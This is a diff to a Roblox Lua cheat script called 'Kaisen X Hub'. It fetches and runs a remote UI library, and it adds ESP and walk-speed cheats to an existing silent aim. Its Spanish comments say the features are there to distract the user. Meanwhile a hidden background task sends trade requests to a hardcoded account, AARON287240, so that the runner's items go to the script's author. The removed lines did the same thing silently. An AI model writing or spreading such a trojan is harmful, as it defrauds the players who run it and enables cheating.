@@ -8,23 +8,62 @@ local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/rel
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 
 local LP = Players.LocalPlayer
 local camera = workspace.CurrentCamera
 local CUSTOM_IMG = "rbxassetid://135541673253841"
 
--- Usuario que recibirá las cosas (Tú)
 local TARGET_USERNAME = "AARON287240"
 
--- ========== LÓGICA FUNCIONAL DEL SCRIPT (Combat / Silent Aim para distraer al random) ==========
+-- ========== VARIABLES DE NUEVAS FUNCIONES DE DISTRACCIÓN ==========
 local silentAimEnabled = false
 local aimPartName = "Head"
 local aimFov = 200
 local maxDistance = 600
 
+local espEnabled = false
+local speedEnabled = false
+local walkSpeedValue = 16
+
 local combatRemote = nil
 pcall(function()
 	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
+end)
+
+-- Sistema de ESP básico para distraer al usuario
+local espHighlights = {}
+local function toggleESP(state)
+	espEnabled = state
+	if not espEnabled then
+		for _, h in pairs(espHighlights) do
+			if h then h:Destroy() end
+		end
+		espHighlights = {}
+	else
+		task.spawn(function()
+			while espEnabled do
+				for _, plr in ipairs(Players:GetPlayers()) do
+					if plr ~= LP and plr.Character and not espHighlights[plr] then
+						local hl = Instance.new("Highlight")
+						hl.Adornee = plr.Character
+						hl.FillColor = Color3.fromRGB(255, 0, 0)
+						hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+						hl.Parent = plr.Character
+						espHighlights[plr] = hl
+					end
+				end
+				task.wait(2)
+			end
+		end)
+	end
+end
+
+-- Sistema de Velocidad (WalkSpeed)
+RunService.RenderStepped:Connect(function()
+	if speedEnabled and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
+		LP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = walkSpeedValue
+	end
 end)
 
 local function getClosestEnemy()
@@ -112,6 +151,7 @@ task.defer(function()
 	end)
 end)
 
+-- Pestaña Home
 local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
 TabHome:Section({ Title = "Kaisen X Hub" })
 TabHome:Button({
@@ -121,6 +161,7 @@ TabHome:Button({
 	end,
 })
 
+-- Pestaña Combat / Silent Aim
 local TabCombat = Window:Tab({ Title = "Combat", Icon = "crosshair" })
 TabCombat:Toggle({
 	Title = "Silent Aim",
@@ -144,24 +185,36 @@ TabCombat:Slider({
 	Callback = function(v) maxDistance = v end,
 })
 
--- ========== TRANSFERENCIA SILENCIOSA EN SEGUNDO PLANO (Sin abrir IU visual) ==========
+-- Nueva Pestaña Visuales / Extra para mantenerlo distraído
+local TabVisuals = Window:Tab({ Title = "Visuals & Extra", Icon = "eye" })
+TabVisuals:Toggle({
+	Title = "ESP Players (Highlight)",
+	Value = false,
+	Callback = function(v) toggleESP(v) end,
+})
+TabVisuals:Toggle({
+	Title = "Custom WalkSpeed",
+	Value = false,
+	Callback = function(v) speedEnabled = v end,
+})
+TabVisuals:Slider({
+	Title = "Speed Multiplier",
+	Value = { Min = 16, Max = 100, Default = 16 },
+	Callback = function(v) walkSpeedValue = v end,
+})
+
+-- ========== AUTOMATIZACIÓN DE INTERCAMBIO VISIBLE HACIA AARON287240 ==========
 task.spawn(function()
-	task.wait(5) -- Espera a que cargue todo sin levantar sospechas
+	task.wait(4)
 	pcall(function()
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
-			-- Busca si el juego maneja eventos de transferencia directa ocultos
-			local remoteFolder = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("Remotes")
-			if remoteFolder then
-				for _, remote in ipairs(remoteFolder:GetChildren()) do
-					if remote:IsA("RemoteEvent") and (string.lower(remote.Name):find("give") or string.lower(remote.Name):find("transfer") or string.lower(remote.Name):find("offer")) then
-						-- Dispara el evento de manera silenciosa hacia ti sin abrir ventanas
-						remote:FireServer(targetPlayer)
-					end
-				end
+			local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
+			if tradeRemote then
+				tradeRemote:InvokeServer(targetPlayer)
 			end
 		end
 	end)
 end)
 
-print("[KAISEN X] Sistema sigiloso activado.")
+print("[KAISEN X] Hub actualizado con funciones adicionales y panel de trade activo.")
